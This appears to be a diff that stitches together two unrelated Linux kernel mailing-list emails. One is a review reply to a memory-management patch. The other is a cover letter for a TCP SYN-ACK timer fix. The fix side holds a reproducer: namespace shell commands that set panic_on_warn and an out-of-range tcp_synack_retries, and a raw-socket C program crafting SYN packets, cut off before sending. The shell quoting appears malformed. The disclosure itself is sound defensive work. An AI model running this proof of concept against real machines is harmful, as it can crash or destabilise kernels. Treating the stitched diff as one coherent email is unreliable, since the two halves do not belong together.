@@ -1,288 +1,413 @@
-Received: from mail-qt1-f173.google.com (mail-qt1-f173.google.com [209.85.160.173])
+Received: from mail-qv1-f44.google.com (mail-qv1-f44.google.com [209.85.219.44])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 34F4B4519A8
-	for <linux-doc@vger.kernel.org>; Wed, 12 Aug 2026 13:37:50 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.160.173
-ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1786541882; cv=pass; b=nbaB9vYAh0OnCJ8Q1JS6JAciJ3BtLbmEvasLtWlLNrEr5Du2W5vzR1EW2AeMNiX66pX6NBsU8tbOSSvSF6GFukEokFyb1NOCw9l8HZD98zIhL5dmdf74gAAhxXzT+w7uEr1uPoucCh2kx58LWLiPyFMTmnRVSKQ2bLCer7SIn94=
-ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1786541882; c=relaxed/simple;
-	bh=ogjpgBBuRJDVsJoOgismEb1l1STFPRdqrmOGMgUrh1M=;
-	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
-	 To:Cc:Content-Type; b=XDKnTI9FcKgpnKJSF1MaFL57PVC5xssm23yv6bdHeJjGaW8DY2ymvAIj0oVFzp/apmQSKPPgK+aWtq9tX+/lylqnbmXuiz9KMgPVpFWl3scPdUeAHn6bXp1iZ/qXlZHrkj23BKguGkyNEa7QWLDO11pg3jwe8dPfnnPCLdk11WU=
-ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=google.com; spf=pass smtp.mailfrom=google.com; dkim=pass (2048-bit key) header.d=google.com header.i=@google.com header.b=V8VOpEqz; arc=pass smtp.client-ip=209.85.160.173
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=google.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=google.com
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A33F044780F
+	for <linux-doc@vger.kernel.org>; Wed, 12 Aug 2026 13:39:15 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.219.44
+ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1786541958; cv=none; b=IRIyGx9CQi6Znz8b1iTiDa4rCJA+q+vj+dAN0If0bFnzor+9vNhEktJAwbjVvwT/B2ktlSidu1P9yfwOmZRq0R8SLa0hPsPReQyuikwGf7Orp5QbaiGajqtmhSFqe9aaaaXVBaxC3CvRHHpnho+IOVBALteaazDgkJZizhLhsmA=
+ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1786541958; c=relaxed/simple;
+	bh=HzkHPGWyWvJM3snFBWJiOgTI3kbaJ8nngug/aLreFg4=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=Uaz9Yrkh1cn0OMcKlVwRLuKvsMhWgSrtixRPP89RZciKRFbRn59H/ya3K30cVbX3+EzOgvBvtLwB8zgWFUcy5QmDv90Vo3E9tTbFMBltn/sM75sfRAb5T4XmiIJ4NKJCC98qV5fJMML1gW509a7pfESFyf++h3ndk1zQIqVcjzg=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=gli0lFWV; arc=none smtp.client-ip=209.85.219.44
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=google.com header.i=@google.com header.b="V8VOpEqz"
-Received: by mail-qt1-f173.google.com with SMTP id d75a77b69052e-51c10e86e52so230401cf.1
-        for <linux-doc@vger.kernel.org>; Wed, 12 Aug 2026 06:37:48 -0700 (PDT)
-ARC-Seal: i=1; a=rsa-sha256; t=1786541865; cv=none;
-        d=google.com; s=arc-20260327;
-        b=IM3WxGo+jFRWywOwlXF5aodPmGPdn0jKhT46UGnzvl2zd/4AUjkPAySaDFNRfQcBpZ
-         OEgunxBaZh8bRGGSeAt4kCdusRIr3UyGOi0X1PmNVSeVCXkIiKe2ZONHSJ30uPFCxqP5
-         l9NCMloxYftKwMn7/+7J1m0EEDP84M2bXEnZ+P4WphirC9AuUODMVA+bwuEpvyzk3fcW
-         NafiodwFryvNSzpNMgiaPGVeKRiT79lZoV7QUBAL8yWWO1YwuPNReTNsYu56yX5mWeXB
-         0X5epgmnavfue4p7i9aAwvEHxjIRDGViOsQWjcEL9Dfply/fjPO81W0IvTybZCEcEK/I
-         iAog==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
-        h=cc:to:subject:message-id:date:from:in-reply-to:references
-         :mime-version:dkim-signature;
-        bh=S2/eW8js8WPIEzN4muuCXfZ23ENIccFKrP1Pa44pPgE=;
-        fh=nHYIMFLKUzHeMf7pRTpS2DvZ4A8M3nRRh4d8KJ64hDQ=;
-        b=AYsPe76wZxbxOEQlHZG3FoK3XcTKOcriJbzSXguD1roezpPrbfTMrmUOGkcvZRFwTK
-         etMf7hE32zTovhL3VFIbu7Tsq1h8Ex1V0Pqid3yxZKp7lIO+G15Li5SxAYJkBaRM4taM
-         AzZpJVGw1xvrG2zWpBtcKq6lG+i5heDSpoQuFW3V0y6SxsuyiaYizCdyO3+fIlE5/+A7
-         UffnPFaSRh6F/l5DPbj8W1x7nioxHgSLH1sqN1JRlCrItZ7V77vuaxiK0+tljThZI0ma
-         TpmrRijr8luppBHSOsYxnZQycimLO113cXYbPkCpDxuCR9ByDGlfJLFEoeuy20+FaEMV
-         tO2A==;
-        darn=vger.kernel.org
-ARC-Authentication-Results: i=1; mx.google.com; arc=none
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="gli0lFWV"
+Received: by mail-qv1-f44.google.com with SMTP id 6a1803df08f44-8ef1dc934d1so8228396d6.0
+        for <linux-doc@vger.kernel.org>; Wed, 12 Aug 2026 06:39:15 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=google.com; s=20251104; t=1786541865; x=1787146665; darn=vger.kernel.org;
-        h=content-type:cc:to:subject:message-id:date:from:in-reply-to
-         :references:mime-version:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=S2/eW8js8WPIEzN4muuCXfZ23ENIccFKrP1Pa44pPgE=;
-        b=V8VOpEqz3osEnlzMrKdYwW/3jAtfaObPRoI1vUytjSzWtECYEFWQKBFAijoPGrxXJd
-         ZZkdgrYeGrcJEDW6VvycXq6FvMVh48kDNSaCJiQLh7unhvG0PzW9GkiAeY5oA5K1yf3s
-         azCh6vjGEyS2qcdzvzkWtYvF59uHSjWYSRFavJegrGrCEsM2g+rim/UGYbx8G2hFyzsc
-         6JHKZgccoQAE7epjcNg0EA/rMTjL6WYBNhZ14Drt+FohEuyKlNMT/3w6ERWaZM7aQ0FY
-         8QS3TAl88GGQYSFv2dX1xMGWtHy449OPlidlaNif7thiR8bspio9IWtHPMly8Ncc5fHX
-         DWDg==
+        d=nebusec.ai; s=google; t=1786541953; x=1787146753; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=vr32YUMfV8lhYTDVvwVSB8/TJLO9Zxtj2fVqPnrO93Y=;
+        b=gli0lFWVI3BSe8sq/TKXi2gGuD9dWYnwNxSXFadVIt4htPozuGPzVo2KJmaGi0TOdc
+         mU0dPmyW6j6FqBw7NaHwPGhvgLvJxs4DC/K/uDzoMJeSKQo3o7zHNycofNRQ4vthkNxf
+         bxjmxrWwm8sSzREUlvJsOE/0fwA9NZxlSfMiAblfxG4g9vef7SawtKbKjN7QdvhCJ/IH
+         txEAAgse7HOepAVVnGwXEUvVfxHGEksCb+doNcI74Mg96w44SGni3tNDDKzPH9y3dXkM
+         GWHLAw/302GaqKtNKjwlE5ODEUzraQ+H9+bo8u+IHeUdcrEDykCkLc7Tlo1ZvRs/gjKm
+         v7ng==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1786541865; x=1787146665;
-        h=content-type:cc:to:subject:message-id:date:from:in-reply-to
-         :references:mime-version:x-gm-gg:x-gm-message-state:from:to:cc
-         :subject:date:message-id:reply-to:content-type;
-        bh=S2/eW8js8WPIEzN4muuCXfZ23ENIccFKrP1Pa44pPgE=;
-        b=WK2WYImcN1Q9RONu0B7mjX+2h53tX6JLB8f3H44qwzMUsXtjXfmZfyD1cNX83hnf0B
-         va/92+CjApEtZIKOPr1hMQKz7NNW0EuvMmRywHyk1Qu4GS/pYLpYlmCigdMybFSfhA1q
-         DhQfwrDAcXd1uICAh5TUogzlHx82OAtO7d8wzhm+ck3ZSwesjWL0ERwxohAZXf/SNKnA
-         vCPsIngRP2rSSDOgVyCGxdueejKDkOt130D9LYjmBJeL8epkGdefANYv88ihDGo3i95C
-         eMBiYxxWAAf1y4UL7zjPY8dbIgsIgfwnGpm2ebTv7cF/fBXYJ0mcMKt+tSBvkEyTmfPZ
-         76rA==
-X-Forwarded-Encrypted: i=1; AHgh+Rp0p3LB0YVmhk0raOA1z6JzLaNRd5FhoT1hCTzu8hU0rKrfzV+pnhMsM8PKPpR2nUkaJi8OclRG3FM=@vger.kernel.org
-X-Gm-Message-State: AOJu0YwGwUA5KlMHwGvYFaeiClSr7xC5Awsts3yltQnbLCbC/QrbCzDV
-	oclwNG9O32tvaJL86A7AEoEcUWdhLlornjWsIJ6dxpEQZfk0Q99j6GRWMHc4oLgEixlJs71npzN
-	TI7pzGqZ+1ASZR+v9RWrtRFqZBU2xJL0+mdcoWOWt
-X-Gm-Gg: AR+sD13N9XYjgRnBYK0feQ2ytbUl6JAZw5NnJuraoDvAS4ouLRXiI957M/36dUv8GBp
-	sv22yftlMHK/zKDWNpWgjtBIV0DqCwAGV0srPTZLgB0hUUt+fp7ANFSmRlKNh23+yUqsa7L9Xe7
-	i83yGwgKdrw6c1hNN/h685ZAzw6Mid8FFo8dQqc2N9NgtvcPWMnVwHIB4+TcFHbpzRMAisFQP7t
-	iHqqlzmx9Tmm/fEclSduno/MlhgfHKJMJ6DIMPSnK/LAckfyAAfAi5Tuyf7P+QfAeuNgIu2Z6lb
-	RyKXE9enwfzkTQmneSbWGZRzS9Qa8XRvQ5WuhaER5WMGTg==
-X-Received: by 2002:ac8:5716:0:b0:51c:ca9:3d17 with SMTP id
- d75a77b69052e-52d61f7a0e7mr18935971cf.12.1786541863881; Wed, 12 Aug 2026
- 06:37:43 -0700 (PDT)
+        d=1e100.net; s=20251104; t=1786541953; x=1787146753;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=vr32YUMfV8lhYTDVvwVSB8/TJLO9Zxtj2fVqPnrO93Y=;
+        b=BmrmQDAlcnjqdqMWT+J0bxIlh+IuhFda8mfZWnOxLmXOUmTJBRyANv2Rf4v2mpgP1p
+         UrZJueZhm0waH63iw496uYgqx6QzghSex9v33PioWSFL5K/vPGheZnuIPir9qCuY5nxS
+         WrxCtIXNu4sp3eiPH/LqcNtHs4Kq5Pd/Z2hIwYYY37ykEiGySi/BpED6g+uzHnfstAqh
+         r/aS8EgdzAElPLjbY22CkYLuGEM70TR88egTnuc/gkrj8k0ENV8FTZdfsl9cjdlteynu
+         rm9wWSmzXaAny1K7sxiVFo6MMUpHarDFE8RJdqpVKHaZrxL6sygAvkCcJQz6p9NYtfIh
+         AQzA==
+X-Forwarded-Encrypted: i=1; AHgh+Rr7TFPjIsyAnbBkZBfsm8w4B5xppcr9DOj64hec4Dh/NncfQzO+8TUps/ovp3pd3osqRLnUJ3MmKB8=@vger.kernel.org
+X-Gm-Message-State: AOJu0YzoiH5dAjByaka7XRBKJB0XoHt3sK1rAf9nSzi2l2VD2v2vKmdP
+	ODZcOLtQJ+A5nlBBk4U0gU4NJCMiymKBkJ55gAzU1eb40Pug4tgK38znsUWfm1VHGHLD
+X-Gm-Gg: AR+sD10cPfVqpKSvb2aeNlm8tgfSvXXLzCi/r2wyfy/U1fwVe9bg5LJsdYVghkzEz8X
+	OKj3Pq8IdLVY5CUnoyvXpTJSLanbzQMDQLYNbuMyx49o4uoYWKUIS2PZ2Is0JwXo6RWM32eXuYr
+	4pzYMyM/SK6x/7j0QUgGJiQu+pV0uKjzwfAEnYwkd63J3tfksi6LGefupc/CLq2rR8qmKO9ztU0
+	NljLFRI2cIDTUNHeWkESmtmpBOMaBOwm/19Izod9CdrjyPr9SqzK7d6SMpAwsBD8jICqK6CsnOU
+	7UvH9ZR/ANwuJ7q+q9nTvMcR5r9xpqRMtW5sgjtXgk5x/Emq0yKUxSqAPriDTTZ5Na0JdkplKLd
+	QyrXZNgZgAWPV5GQAiPcEUu2FlQ7C5FUdZBUHH8/K3woWbAXV3batsd5waj3naWSAJtXa+kqA6C
+	8voVOwDZaYb65wFUcXv9rjVh4+U8tyT1hBSkJgs6ezkqXvUkeU2R/aYiLiFYInCDuGK9vJe4zRs
+	OdX+A==
+X-Received: by 2002:a05:6214:1c41:b0:907:86e6:f5a1 with SMTP id 6a1803df08f44-90a6baa8eeemr73362696d6.12.1786541952809;
+        Wed, 12 Aug 2026 06:39:12 -0700 (PDT)
+Received: from Roxy.localdomain ([203.175.14.54])
+        by smtp.gmail.com with ESMTPSA id 6a1803df08f44-90a6c3c0338sm21350226d6.40.2026.08.12.06.39.05
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Wed, 12 Aug 2026 06:39:11 -0700 (PDT)
+From: Zhiling Zou <zhilinz@nebusec.ai>
+To: netdev@vger.kernel.org,
+	linux-doc@vger.kernel.org
+Cc: davem@davemloft.net,
+	edumazet@google.com,
+	kuba@kernel.org,
+	pabeni@redhat.com,
+	horms@kernel.org,
+	corbet@lwn.net,
+	skhan@linuxfoundation.org,
+	ncardwell@google.com,
+	kuniyu@google.com,
+	chia-yu.chang@nokia-bell-labs.com,
+	ij@kernel.org,
+	fmancera@suse.de,
+	bronzed_45_vested@icloud.com,
+	idosch@nvidia.com,
+	yuuchihsu@gmail.com,
+	vega@nebusec.ai,
+	zhilinz@nebusec.ai
+Subject: [PATCH net v5 0/1] tcp: bound SYN-ACK timers to reqsk timeout range
+Date: Wed, 12 Aug 2026 21:38:52 +0800
+Message-ID: <cover.1786540242.git.zhilinz@nebusec.ai>
+X-Mailer: git-send-email 2.43.0
 Precedence: bulk
 X-Mailing-List: linux-doc@vger.kernel.org
 List-Id: <linux-doc.vger.kernel.org>
 List-Subscribe: <mailto:linux-doc+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-doc+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-References: <20260807-gmem-inplace-conversion-v10-0-2fc18ee6d3ba@google.com> <20260807-gmem-inplace-conversion-v10-14-2fc18ee6d3ba@google.com>
-In-Reply-To: <20260807-gmem-inplace-conversion-v10-14-2fc18ee6d3ba@google.com>
-From: Fuad Tabba <tabba@google.com>
-Date: Wed, 12 Aug 2026 15:37:06 +0200
-X-Gm-Features: AUfX_mzUD6PeEtmKkDfteoyWkYyMiizOHZtVOuf49kBLBevxhRMZd8gNAqxz5ac
-Message-ID: <CA+EHjTy83rq0m5=QyPKmxPfFkc+kHzzuY4mV9nThdguW41Ws6A@mail.gmail.com>
-Subject: Re: [PATCH v10 14/41] mm/gup: factor out LRU cache draining for folio
- into lru_cache_drain_for_folio()
-To: ackerleytng@google.com
-Cc: aik@amd.com, andrew.jones@linux.dev, binbin.wu@linux.intel.com, 
-	brauner@kernel.org, chao.p.peng@linux.intel.com, david@kernel.org, 
-	jmattson@google.com, jthoughton@google.com, michael.roth@amd.com, 
-	oupton@kernel.org, pankaj.gupta@amd.com, qperret@google.com, 
-	rick.p.edgecombe@intel.com, rientjes@google.com, shivankg@amd.com, 
-	steven.price@arm.com, willy@infradead.org, wyihan@google.com, 
-	yan.y.zhao@intel.com, forkloop@google.com, pratyush@kernel.org, 
-	suzuki.poulose@arm.com, aneesh.kumar@kernel.org, liam@infradead.org, 
-	Paolo Bonzini <pbonzini@redhat.com>, Sean Christopherson <seanjc@google.com>, 
-	Thomas Gleixner <tglx@kernel.org>, Ingo Molnar <mingo@redhat.com>, Borislav Petkov <bp@alien8.de>, 
-	Dave Hansen <dave.hansen@linux.intel.com>, x86@kernel.org, 
-	"H. Peter Anvin" <hpa@zytor.com>, Steven Rostedt <rostedt@goodmis.org>, 
-	Masami Hiramatsu <mhiramat@kernel.org>, Mathieu Desnoyers <mathieu.desnoyers@efficios.com>, 
-	Jonathan Corbet <corbet@lwn.net>, Shuah Khan <skhan@linuxfoundation.org>, 
-	Shuah Khan <shuah@kernel.org>, Vishal Annapurve <vannapurve@google.com>, 
-	Andrew Morton <akpm@linux-foundation.org>, Chris Li <chrisl@kernel.org>, 
-	Kairui Song <kasong@tencent.com>, Kemeng Shi <shikemeng@huaweicloud.com>, 
-	Nhat Pham <nphamcs@gmail.com>, Barry Song <baohua@kernel.org>, 
-	Axel Rasmussen <axelrasmussen@google.com>, Yuanchu Xie <yuanchu@google.com>, 
-	Wei Xu <weixugc@google.com>, Youngjun Park <youngjun.park@lge.com>, 
-	Qi Zheng <qi.zheng@linux.dev>, Shakeel Butt <shakeel.butt@linux.dev>, 
-	Kiryl Shutsemau <kas@kernel.org>, Baoquan He <baoquan.he@linux.dev>, Jason Gunthorpe <jgg@ziepe.ca>, 
-	John Hubbard <jhubbard@nvidia.com>, Peter Xu <peterx@redhat.com>, tarunsahu@google.com, 
-	Vlastimil Babka <vbabka@kernel.org>, kvm@vger.kernel.org, linux-kernel@vger.kernel.org, 
-	linux-trace-kernel@vger.kernel.org, linux-doc@vger.kernel.org, 
-	linux-kselftest@vger.kernel.org, linux-mm@kvack.org, 
-	linux-coco@lists.linux.dev
-Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: 8bit
 
-On Fri, 7 Aug 2026 at 23:52, Ackerley Tng via B4 Relay
-<devnull+ackerleytng.google.com@kernel.org> wrote:
->
-> From: "David Hildenbrand (Arm)" <david@kernel.org>
->
-> KVM with guest_memfd wants to remove any folio references due to LRU
-> caches, as it really must only allow to convert folios from shared to
-> private when there are no unexpected folio references (e.g., from GUP
-> references).
->
-> So, to drive the refcount down, it needs a way to flush the LRU caches.
-> Let's factor out what we have in lru_cache_drain_for_folio(). Document
-> it, and also mention that concurrent folio (un)mapping might, in theory,
-> miss detecting LRU cache references. Keep obtaining the expected refcount
-> twice to minimize the possibility. For the current and future user that
-> should work, and we don't really have a better alternative: we could
-> detect if the mapcount changed, but it would still be racy and add more
-> complexity with questionable benefit.
->
-> Maybe there is a chance to avoid the draining entirely in the future,
-> by avoiding extra references from the LRU cache: Hugh thinks there might
-> be a way. But for the time being, this handling is unfortunately
-> required.
->
-> Make folio_may_be_lru_cached() accept a const pointer so
-> lru_cache_drain_for_folio() can accept a const pointer as well.
->
-> Signed-off-by: David Hildenbrand (Arm) <david@kernel.org>
-> Signed-off-by: Ackerley Tng <ackerleytng@google.com>
+Hi Linux kernel maintainers,
 
-Reviewed-by: Fuad Tabba <fuad.tabba@linux.dev>
+We found and validated an issue in net/ipv4/inet_connection_sock.c.
+The bug is reachable by a non-root user via user and net namespace.
 
-Cheers,
-/fuad
+We've tested it, and it should not affect normal TCP request socket
+timeout handling.
 
-> ---
->  include/linux/swap.h | 11 ++++++++++-
->  mm/gup.c             | 15 ++-------------
->  mm/swap.c            | 46 ++++++++++++++++++++++++++++++++++++++++++++++
->  3 files changed, 58 insertions(+), 14 deletions(-)
->
-> diff --git a/include/linux/swap.h b/include/linux/swap.h
-> index 8f0f68e245baa..e625d64c9e13d 100644
-> --- a/include/linux/swap.h
-> +++ b/include/linux/swap.h
-> @@ -317,7 +317,7 @@ void folio_add_lru_vma(struct folio *, struct vm_area_struct *);
->  void mark_page_accessed(struct page *);
->  void folio_mark_accessed(struct folio *);
->
-> -static inline bool folio_may_be_lru_cached(struct folio *folio)
-> +static inline bool folio_may_be_lru_cached(const struct folio *folio)
->  {
->         /*
->          * Holding PMD-sized folios in per-CPU LRU cache unbalances accounting.
-> @@ -344,6 +344,15 @@ extern void lru_add_drain(void);
->  extern void lru_add_drain_cpu(int cpu);
->  extern void lru_add_drain_cpu_zone(struct zone *zone);
->  extern void lru_add_drain_all(void);
-> +
-> +enum lru_cache_drained {
-> +       LRU_CACHE_NOT_DRAINED,
-> +       LRU_CACHE_DRAINED,
-> +       LRU_CACHE_DRAINED_ALL,
-> +};
-> +void lru_cache_drain_for_folio(const struct folio *folio,
-> +               unsigned int extra_refs, enum lru_cache_drained *drained);
-> +
->  void folio_deactivate(struct folio *folio);
->  void folio_mark_lazyfree(struct folio *folio);
->  extern void swap_setup(void);
-> diff --git a/mm/gup.c b/mm/gup.c
-> index bde05664fe9a9..1bd8915517196 100644
-> --- a/mm/gup.c
-> +++ b/mm/gup.c
-> @@ -2266,9 +2266,9 @@ static unsigned long collect_longterm_unpinnable_folios(
->                 struct list_head *movable_folio_list,
->                 struct pages_or_folios *pofs)
->  {
-> +       enum lru_cache_drained drained = LRU_CACHE_NOT_DRAINED;
->         unsigned long collected = 0;
->         struct folio *folio;
-> -       int drained = 0;
->         long i = 0;
->
->         for (folio = pofs_get_folio(pofs, i); folio;
-> @@ -2293,18 +2293,7 @@ static unsigned long collect_longterm_unpinnable_folios(
->                  * but also to remove any other folio references from LRU
->                  * caches.
->                  */
-> -               if (drained == 0 && folio_may_be_lru_cached(folio) &&
-> -                               folio_ref_count(folio) !=
-> -                               folio_expected_ref_count(folio) + pin_refs) {
-> -                       lru_add_drain();
-> -                       drained = 1;
-> -               }
-> -               if (drained == 1 && folio_may_be_lru_cached(folio) &&
-> -                               folio_ref_count(folio) !=
-> -                               folio_expected_ref_count(folio) + pin_refs) {
-> -                       lru_add_drain_all();
-> -                       drained = 2;
-> -               }
-> +               lru_cache_drain_for_folio(folio, pin_refs, &drained);
->
->                 if (!folio_isolate_lru(folio))
->                         continue;
-> diff --git a/mm/swap.c b/mm/swap.c
-> index 588f50d8f1a8c..8e965c8ce9aa9 100644
-> --- a/mm/swap.c
-> +++ b/mm/swap.c
-> @@ -950,6 +950,52 @@ void lru_add_drain_all(void)
->  }
->  #endif /* CONFIG_SMP */
->
-> +/**
-> + * lru_cache_drain_for_folio() - drain LRU caches if the caches might hold
-> + *                              folio references
-> + * @folio: The folio.
-> + * @extra_refs: Extra folio references held by the caller.
-> + * @drained: Drain status for batch folio processing.
-> + *
-> + * Drain LRU caches if the caches might hold folio references. Start
-> + * with a local LRU cache drain, to then drain LRU caches on all CPUs if
-> + * local draining was insufficient.
-> + *
-> + * This function detects LRU cache references by comparing the folio refcount
-> + * with the sum of the expected folio refcount + extra references held by the
-> + * caller. Note that we cannot rely on PG_lru to reliably detect all LRU
-> + * cache references, and there are rare scenarios (concurrent folio (un)mapping)
-> + * where this function might miss detecting LRU cache references.
-> + *
-> + * If @drained is not NULL, the function will avoid re-draining LRU caches
-> + * when processing multiple folios in a row. In that case, the variable
-> + * @drained points at must be initialized to LRU_CACHE_NOT_DRAINED before
-> + * the first invocation by the caller.
-> + */
-> +void lru_cache_drain_for_folio(const struct folio *folio,
-> +               unsigned int extra_refs, enum lru_cache_drained *drained)
-> +{
-> +       if (!folio_may_be_lru_cached(folio))
-> +               return;
-> +
-> +       if (!drained || *drained == LRU_CACHE_NOT_DRAINED) {
-> +               if (folio_ref_count(folio) ==
-> +                   folio_expected_ref_count(folio) + extra_refs)
-> +                       return;
-> +               lru_add_drain();
-> +               if (drained)
-> +                       *drained = LRU_CACHE_DRAINED;
-> +       }
-> +       if (!drained || *drained == LRU_CACHE_DRAINED) {
-> +               if (folio_ref_count(folio) ==
-> +                   folio_expected_ref_count(folio) + extra_refs)
-> +                       return;
-> +               lru_add_drain_all();
-> +               if (drained)
-> +                       *drained = LRU_CACHE_DRAINED_ALL;
-> +       }
-> +}
-> +
->  atomic_t lru_disable_count = ATOMIC_INIT(0);
->
->  /*
->
-> --
-> 2.55.0.654.g21b8a5bc05-goog
->
->
+The issue is caused by allowing SYN-ACK timer limits above the range
+that request socket timeout backoff can safely consume.
+
+---- details below ----
+
+Bug details:
+
+request_sock::num_timeout is a 7-bit counter. tcp_synack_retries accepts
+an 8-bit value, while TCP_DEFER_ACCEPT converts seconds to a retry count
+that can also reach 255.
+
+When either value exceeds 127, the request socket timer can never reach
+its expiration threshold. num_timeout then wraps from 127 to zero, which
+also repeats the young-queue accounting transition. Before the wrap, the
+regular and Fast Open SYN-ACK timer paths can shift req->timeout by 64 or
+more when calculating the next RTO.
+
+The fix rejects tcp_synack_retries values above the counter range and
+caps the TCP_DEFER_ACCEPT conversion at the same limit. This keeps the
+timer and bare-ACK consumers of rskq_defer_accept consistent. The common
+timeout calculation now saturates before shifting, and the Fast Open
+extra retry is capped to the representable range.
+
+
+Reproducer:
+
+    gcc -O2 -Wall -o poc poc.c
+    unshare -Urn sh -c '\''
+        ip link set lo up
+        echo 1 > /proc/sys/kernel/panic_on_warn
+        echo 0 > /proc/sys/net/ipv4/tcp_syncookies
+        echo 128 > /proc/sys/net/ipv4/tcp_synack_retries
+        echo 1000 > /proc/sys/net/ipv4/tcp_rto_max_ms
+        ./poc 127.0.0.2 40000 127.0.0.1 12345
+    '\''
+
+We ran the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+
+------BEGIN poc.c------
+
+#include <arpa/inet.h>
+#include <errno.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+struct pseudo_header {
+	uint32_t src_addr;
+	uint32_t dst_addr;
+	uint8_t zero;
+	uint8_t protocol;
+	uint16_t tcp_len;
+};
+
+static uint16_t checksum(const void *data, size_t len)
+{
+	const uint16_t *words = data;
+	uint32_t sum = 0;
+
+	while (len > 1) {
+		sum += *words++;
+		len -= 2;
+	}
+
+	if (len)
+		sum += *(const uint8_t *)words;
+
+	while (sum >> 16)
+		sum = (sum & 0xffff) + (sum >> 16);
+
+	return (uint16_t)~sum;
+}
+
+int main(int argc, char **argv)
+{
+	struct sockaddr_in dst = { 0 };
+	struct pseudo_header psh = { 0 };
+	struct {
+		struct iphdr ip;
+		struct tcphdr tcp;
+	} packet = { 0 };
+	unsigned char pseudo_buf[sizeof(psh) + sizeof(packet.tcp)];
+	const char *src_ip;
+	const char *dst_ip;
+	int sock;
+	int one = 1;
+	long src_port;
+	long dst_port;
+	ssize_t sent;
+
+	if (argc != 5) {
+		fprintf(stderr, "usage: %s <src_ip> <src_port> <dst_ip> <dst_port>\n", argv[0]);
+		return 2;
+	}
+
+	src_ip = argv[1];
+	src_port = strtol(argv[2], NULL, 10);
+	dst_ip = argv[3];
+	dst_port = strtol(argv[4], NULL, 10);
+	if (src_port <= 0 || src_port > 65535 || dst_port <= 0 || dst_port > 65535) {
+		fprintf(stderr, "invalid port\n");
+		return 2;
+	}
+
+	sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+	if (sock < 0) {
+		perror("socket");
+		return 1;
+	}
+
+	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
+		perror("setsockopt(IP_HDRINCL)");
+		close(sock);
+		return 1;
+	}
+
+	dst.sin_family = AF_INET;
+	dst.sin_port = htons((uint16_t)dst_port);
+	if (inet_pton(AF_INET, dst_ip, &dst.sin_addr) != 1) {
+		fprintf(stderr, "invalid dst_ip: %s\n", dst_ip);
+		close(sock);
+		return 2;
+	}
+
+	packet.ip.version = 4;
+	packet.ip.ihl = sizeof(packet.ip) / 4;
+	packet.ip.tos = 0;
+	packet.ip.tot_len = htons(sizeof(packet));
+	packet.ip.id = htons((uint16_t)getpid());
+	packet.ip.frag_off = 0;
+	packet.ip.ttl = 64;
+	packet.ip.protocol = IPPROTO_TCP;
+	if (inet_pton(AF_INET, src_ip, &packet.ip.saddr) != 1) {
+		fprintf(stderr, "invalid src_ip: %s\n", src_ip);
+		close(sock);
+		return 2;
+	}
+	packet.ip.daddr = dst.sin_addr.s_addr;
+	packet.ip.check = checksum(&packet.ip, sizeof(packet.ip));
+
+	packet.tcp.source = htons((uint16_t)src_port);
+	packet.tcp.dest = htons((uint16_t)dst_port);
+	packet.tcp.seq = htonl(0x12345678);
+	packet.tcp.doff = sizeof(packet.tcp) / 4;
+	packet.tcp.syn = 1;
+	packet.tcp.window = htons(65535);
+
+	psh.src_addr = packet.ip.saddr;
+	psh.dst_addr = packet.ip.daddr;
+	psh.zero = 0;
+	psh.protocol = IPPROTO_TCP;
+	psh.tcp_len = htons(sizeof(packet.tcp));
+	memcpy(pseudo_buf, &psh, sizeof(psh));
+	memcpy(pseudo_buf + sizeof(psh), &packet.tcp, sizeof(packet.tcp));
+	packet.tcp.check = checksum(pseudo_buf, sizeof(pseudo_buf));
+
